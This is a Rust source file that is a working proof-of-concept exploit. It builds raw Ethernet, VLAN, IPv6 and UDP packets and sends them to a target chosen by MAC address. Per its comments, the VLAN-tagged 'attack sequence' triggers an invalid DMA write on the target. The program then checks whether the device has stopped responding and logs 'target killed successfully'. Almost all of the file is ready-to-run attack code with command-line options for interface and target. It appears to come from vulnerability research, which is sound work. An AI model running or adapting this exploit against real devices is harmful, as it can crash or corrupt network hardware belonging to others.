use anyhow::{anyhow, bail, Context, Result};
use clap::Parser;
use log::{info, warn};
use pnet::{
    datalink::DataLinkReceiver,
    ipnetwork::IpNetwork,
    packet::{
        ethernet::{
            EtherType, EtherTypes, EthernetPacket, MutableEthernetPacket,
        },
        ip::{IpNextHeaderProtocol, IpNextHeaderProtocols},
        ipv6::{Ipv6Packet, MutableIpv6Packet},
        udp::{MutableUdpPacket, UdpPacket},
        vlan::MutableVlanPacket,
        Packet,
    },
    util::MacAddr,
};
use std::{
    net::Ipv6Addr,
    str::FromStr,
    time::{Duration, Instant},
};

////////////////////////////////////////////////////////////////////////////////

const SOURCE_PORT: u16 = 2000;
const DEST_PORT: u16 = 7777;

/// Simple program to greet a person
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Ethernet interface to use
    #[arg(short, long)]
    iface: String,

    /// MAC address to target
    #[arg(long)]
    mac: String,

    #[arg(short, long, default_value_t = 0)]
    pad: usize,
}

fn main() -> Result<()> {
    env_logger::Builder::from_env(
        env_logger::Env::default().default_filter_or("info"),
    )
    .init();

    // Open a bogus socket to listen on port 2000, which prevents the OS from
    // replying with ICMPv6 messages about the port being unreachable.
    let _socket = std::net::UdpSocket::bind(format!("[::]:{SOURCE_PORT}"))?;

    let args = Args::parse();
    let dest_mac = MacAddr::from_str(&args.mac)
        .with_context(|| format!("failed to parse '{}'", args.mac))?;
    let dest_ip = mac_to_ipv6(dest_mac);
    info!("target MAC address:  {dest_mac:?}");
    info!("target IPv6 address: {dest_ip:?}");

    let interfaces = pnet::datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == args.iface)
        .ok_or_else(|| anyhow!("could not find interface '{}'", args.iface))?;
    let source_mac = interface.mac.unwrap();
    let source_ip = interface
        .ips
        .iter()
        .find_map(|i| match i {
            IpNetwork::V6(ip) => Some(ip.ip()),
            _ => None,
        })
        .ok_or_else(|| anyhow!("could not get IPv6 address from interface"))?;

    let cfg = pnet::datalink::Config {
        read_timeout: Some(Duration::from_millis(100)),
        ..Default::default()
    };
    let (mut sender, mut receiver) =
        match pnet::datalink::channel(&interface, cfg)? {
            pnet::datalink::Channel::Ethernet(tx, rx) => (tx, rx),
            _ => bail!("Unknown channel type"),
        };

    let builder = Builder {
        source_ip,
        source_mac,
        dest_ip,
        dest_mac,
    };

    // Send a friendly packet to ensure that we're in the target's NDP tables
    info!("sending initial packet to populate NDP tables");
    let (udp, payload_len, tag) = builder.udp(&[0]);
    let (ipv6, ethertype) = builder.ipv6(udp, payload_len, tag);
    let hello_packet = builder.eth(ipv6, ethertype);
    sender.send_to(hello_packet.packet(), None);
    let (reply, _rx_time) =
        receive_udp(receiver.as_mut(), Duration::from_millis(500)).ok_or_else(
            || {
                anyhow!(
                    "could not send initial packet; \
                     is the target already locked up?"
                )
            },
        )?;
    assert_eq!(reply, vec![0]);
    info!("received reply from hello packet");

    let (udp, payload_len, tag) = builder.udp(&[b'1']);
    let (ipv6, ethertype) = builder.ipv6(udp, payload_len, tag);
    let delay_packet = builder.eth(ipv6, ethertype);

    // Build our attack packets with a VLAN VID payload, triggering an invalid
    // DMA write address.
    let mut packets = vec![];
    for i in 1..6 {
        let mut data: Vec<u8> = format!("data-{i}").as_bytes().to_vec();
        for _p in 0..46 {
            // found experimentally
            data.push(b'0');
        }
        let (udp, payload_len, tag) = builder.udp(&data);
        let (ipv6, ethertype) = builder.ipv6(udp, payload_len, tag);
        let (vlan, ethertype) = builder.vlan(0x301, ipv6, ethertype);
        let eth = builder.eth(vlan, ethertype);
        packets.push(eth);
    }

    // Send our attack sequence
    info!("sending attack sequence");
    let send_start = Instant::now();
    sender.send_to(delay_packet.packet(), None);
    let send_end = Instant::now();
    std::thread::sleep(Duration::from_millis(50));

    for p in packets {
        sender.send_to(p.packet(), None);
    }
    let (reply, rx_time) =
        receive_udp(receiver.as_mut(), Duration::from_millis(500))
            .ok_or_else(|| anyhow!("timeout waiting for rx"))?;
    info!("received reply from delay packet: {reply:?}");

    info!("time since send called:   {:?}", rx_time - send_end);
    info!("time since send returned: {:?}", rx_time - send_start);

    sender.send_to(hello_packet.packet(), None);
    if receive_udp(receiver.as_mut(), Duration::from_millis(500)).is_none() {
        info!("target killed successfully");
    } else {
        warn!("target is still replying");
    }

    Ok(())
}

/// Receives a single UDP packet
///
/// Returns the packet data and arrival time on success, or `None` on timeout
fn receive_udp(
    receiver: &mut dyn DataLinkReceiver,
    timeout: Duration,
) -> Option<(Vec<u8>, Instant)> {
    let start = Instant::now();
    while Instant::now() - start < timeout {
        let Ok(rx) = receiver.next() else {
            continue;
        };
        let rx_time = Instant::now();
        let packet = EthernetPacket::new(rx).unwrap();
        if EtherTypes::Ipv6 == packet.get_ethertype() {
            let header = Ipv6Packet::new(packet.payload()).unwrap();
            if IpNextHeaderProtocols::Udp == header.get_next_header() {
                let udp = UdpPacket::new(header.payload()).unwrap();
                if udp.get_destination() == SOURCE_PORT {
                    return Some((udp.payload().to_owned(), rx_time));
                }
            }
        }
    }
    None
}

/// Convert a MAC address to a link-local IPv6 address
fn mac_to_ipv6(mut mac: MacAddr) -> Ipv6Addr {
    mac.0 ^= 2;
    Ipv6Addr::new(
        0xfe80,
        0,
        0,
        0,
        u16::from_be_bytes([mac.0, mac.1]),
        u16::from_be_bytes([mac.2, 0xff]),
        u16::from_be_bytes([0xfe, mac.3]),
        u16::from_be_bytes([mac.4, mac.5]),
    )
}

/// Helper class to build relevant packets without too much boilerplate
struct Builder {
    source_ip: Ipv6Addr,
    dest_ip: Ipv6Addr,
    source_mac: MacAddr,
    dest_mac: MacAddr,
}

impl Builder {
    fn udp(&self, data: &[u8]) -> (impl Packet, u16, IpNextHeaderProtocol) {
        let payload_len: u16 =
            (data.len() + 8).try_into().expect("packet size overflow");

        // Build from the bottom up, so that each buffer is exactly the right size
        let mut udp =
            MutableUdpPacket::owned(vec![0u8; payload_len as usize]).unwrap();
        udp.set_source(SOURCE_PORT);
        udp.set_destination(DEST_PORT); // our target port
        udp.set_payload(data);
        udp.set_length(payload_len); // UDP header length
        let udp_chk = pnet::packet::udp::ipv6_checksum(
            &udp.to_immutable(),
            &self.source_ip,
            &self.dest_ip,
        );
        udp.set_checksum(udp_chk);
        (udp, payload_len, IpNextHeaderProtocols::Udp)
    }

    fn ipv6<P: Packet>(
        &self,
        data: P,
        payload_len: u16,
        next_header: IpNextHeaderProtocol,
    ) -> (impl Packet, EtherType) {
        let mut ipv6 = MutableIpv6Packet::owned(vec![
            0u8;
            Ipv6Packet::minimum_packet_size()
                + data.packet().len()
        ])
        .unwrap();

        ipv6.set_version(6);
        ipv6.set_hop_limit(64);
        ipv6.set_next_header(next_header);
        ipv6.set_destination(self.dest_ip);
        ipv6.set_source(self.source_ip);
        ipv6.set_payload_length(payload_len);
        ipv6.set_payload(data.packet());

        (ipv6, EtherTypes::Ipv6)
    }

    fn vlan<P: Packet>(
        &self,
        vid: u16,
        data: P,
        tag: EtherType,
    ) -> (impl Packet, EtherType) {
        let mut vlan = MutableVlanPacket::owned(vec![
            0u8;
            MutableVlanPacket::minimum_packet_size()
                + data.packet().len()
        ])
        .unwrap();

        vlan.set_ethertype(tag);
        vlan.set_vlan_identifier(vid);
        vlan.set_payload(data.packet());
        (vlan, EtherTypes::Vlan)
    }

    fn eth<P: Packet>(&self, data: P, tag: EtherType) -> impl Packet {
        let mut eth =
            MutableEthernetPacket::owned(vec![
                0u8;
                EthernetPacket::minimum_packet_size()
                    + data.packet().len()
            ])
            .unwrap();
        eth.set_destination(self.dest_mac);
        eth.set_source(self.source_mac);
        eth.set_ethertype(tag);
        eth.set_payload(data.packet());
        eth
    }
}
